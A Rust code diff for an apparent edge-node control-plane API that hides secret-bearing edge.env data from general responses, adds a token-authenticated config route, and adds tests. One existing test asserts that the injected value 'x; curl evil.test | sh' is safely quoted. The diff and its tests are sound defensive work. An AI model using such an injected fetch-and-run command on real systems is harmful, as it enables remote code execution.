@@ -7,8 +7,9 @@ use crate::repository;
 use crate::service::agent_http;
 use crate::state::AppState;
 use axum::{
-    extract::{Path, State},
-    http::{HeaderMap, StatusCode},
+    extract::{Path, Query, State},
+    http::{header, HeaderMap, HeaderValue, StatusCode},
+    response::{IntoResponse, Response},
     Json,
 };
 use serde::{Deserialize, Serialize};
@@ -67,8 +68,25 @@ fn to_dto(r: repository::NodeRow) -> NodeDto {
         city: r.city,
         weight: r.weight,
         max_bandwidth_mbps: r.max_bandwidth_mbps,
-        edge_profile: r.edge_profile,
+        // The profile carries the rendered edge.env (node token + shared
+        // secrets). General list/detail responses must not expose it; the
+        // node fetches it through the token-authenticated /edge/config route.
+        edge_profile: profile_without_env(&r.edge_profile),
     }
+}
+
+/// Strip the rendered `edge.env` from a profile before it enters an API DTO.
+///
+/// Fail closed (`{}`) on malformed JSON rather than returning a blob that might
+/// still contain the secret-bearing `env` field.
+fn profile_without_env(raw: &str) -> String {
+    let Ok(mut value) = serde_json::from_str::<serde_json::Value>(raw) else {
+        return "{}".to_string();
+    };
+    if let Some(object) = value.as_object_mut() {
+        object.remove("env");
+    }
+    value.to_string()
 }
 
 #[derive(Serialize)]
@@ -412,6 +430,20 @@ fn shell_quote(value: &str) -> String {
     out
 }
 
+/// The profile also carries the rendered `edge.env` so a node token can fetch
+/// its configuration; the old 8 KiB bound is too small for that file.
+const MAX_EDGE_PROFILE_BYTES: usize = 128 * 1024;
+
+/// Extract the rendered `edge.env` from the opaque profile JSON.
+fn edge_env_from_profile(raw: &str) -> Option<String> {
+    let value: serde_json::Value = serde_json::from_str(raw).ok()?;
+    value
+        .get("env")
+        .and_then(|env| env.as_str())
+        .filter(|env| !env.trim().is_empty())
+        .map(ToOwned::to_owned)
+}
+
 /// Values pasted verbatim into `export X=...` or `docker run -e X=...`.
 ///
 /// Region names are operator labels; anything outside this set is almost
@@ -424,7 +456,7 @@ fn validate_edge_profile(raw: &str) -> Result<String, String> {
     if trimmed.is_empty() {
         return Ok(String::new());
     }
-    if trimmed.len() > 8192 {
+    if trimmed.len() > MAX_EDGE_PROFILE_BYTES {
         return Err("edge_profile is too large".into());
     }
     let value: serde_json::Value =
@@ -719,6 +751,66 @@ pub async fn create(
             waf_rulepack_configured: !state.config.waf_rulepack_secret.trim().is_empty(),
         }),
     ))
+}
+
+#[derive(Deserialize)]
+pub struct EdgeConfigQuery {
+    /// `NODE_ID`; optional because the agent token already identifies the node.
+    pub edge: Option<String>,
+}
+
+/// `GET /api/v1/edge/config?edge=<NODE_ID>` — the node's rendered `edge.env`.
+///
+/// The caller must present the node's own `X-Lagran-Agent-Token`. The token is
+/// bound to a node name, so one edge cannot fetch another node's file. The
+/// response contains the node token and shared WAF/challenge secrets, so it is
+/// marked `no-store` and should only travel over the control plane channel.
+pub async fn edge_config(
+    State(state): State<AppState>,
+    agent: AgentAuth,
+    Query(query): Query<EdgeConfigQuery>,
+) -> Result<Response, (StatusCode, Json<ErrorBody>)> {
+    let requested = query.edge.as_deref().unwrap_or("").trim();
+    if !requested.is_empty() && requested != agent.node_name {
+        return Err((
+            StatusCode::FORBIDDEN,
+            Json(ErrorBody {
+                error: "edge does not match the agent token".into(),
+            }),
+        ));
+    }
+
+    let row = repository::get_node_by_name(&state.pool, &agent.node_name)
+        .await
+        .map_err(|_| db_error())?
+        .ok_or_else(|| {
+            (
+                StatusCode::NOT_FOUND,
+                Json(ErrorBody {
+                    error: "node not found".into(),
+                }),
+            )
+        })?;
+
+    let Some(env) = edge_env_from_profile(&row.edge_profile) else {
+        return Err((
+            StatusCode::CONFLICT,
+            Json(ErrorBody {
+                error: "no generated edge.env for this node; save it again from the console wizard"
+                    .into(),
+            }),
+        ));
+    };
+
+    let mut response = env.into_response();
+    response.headers_mut().insert(
+        header::CONTENT_TYPE,
+        HeaderValue::from_static("text/plain; charset=utf-8"),
+    );
+    response
+        .headers_mut()
+        .insert(header::CACHE_CONTROL, HeaderValue::from_static("no-store"));
+    Ok(response)
 }
 
 pub async fn detail(
@@ -1090,6 +1182,44 @@ mod tests {
         assert!(cmds.binary.contains("'x; curl evil.test | sh'"));
         assert!(!cmds.binary.contains("NODE_REGION=x;"));
         assert!(cmds.docker.contains("'x; curl evil.test | sh'"));
+    }
+
+    #[test]
+    fn general_dtos_do_not_expose_the_rendered_env() {
+        let raw = serde_json::json!({
+            "hardware": { "cpuCores": 4 },
+            "infra": { "adminListen": "0.0.0.0:8081" },
+            "env": "AGENT_TOKEN=secret\n"
+        })
+        .to_string();
+        let stripped = profile_without_env(&raw);
+        let parsed: serde_json::Value = serde_json::from_str(&stripped).unwrap();
+        assert!(parsed.get("env").is_none());
+        assert!(parsed.get("hardware").is_some());
+        assert_eq!(profile_without_env("not json"), "{}");
+    }
+
+    #[test]
+    fn edge_env_is_extracted_from_the_profile() {
+        let raw = serde_json::json!({ "env": "CONTROL_URL=https://cp.example\n" }).to_string();
+        assert_eq!(
+            edge_env_from_profile(&raw).as_deref(),
+            Some("CONTROL_URL=https://cp.example\n")
+        );
+        assert!(edge_env_from_profile("{}").is_none());
+        assert!(edge_env_from_profile(r#"{"env":"   "}"#).is_none());
+        assert!(edge_env_from_profile("not json").is_none());
+    }
+
+    #[test]
+    fn profile_size_allows_the_rendered_env() {
+        let env = "A=1\n".repeat(20_000);
+        let raw = serde_json::json!({ "env": env }).to_string();
+        assert!(validate_edge_profile(&raw).is_ok());
+
+        let huge = "A=1\n".repeat(100_000);
+        let raw = serde_json::json!({ "env": huge }).to_string();
+        assert!(validate_edge_profile(&raw).is_err());
     }
 
     #[test]
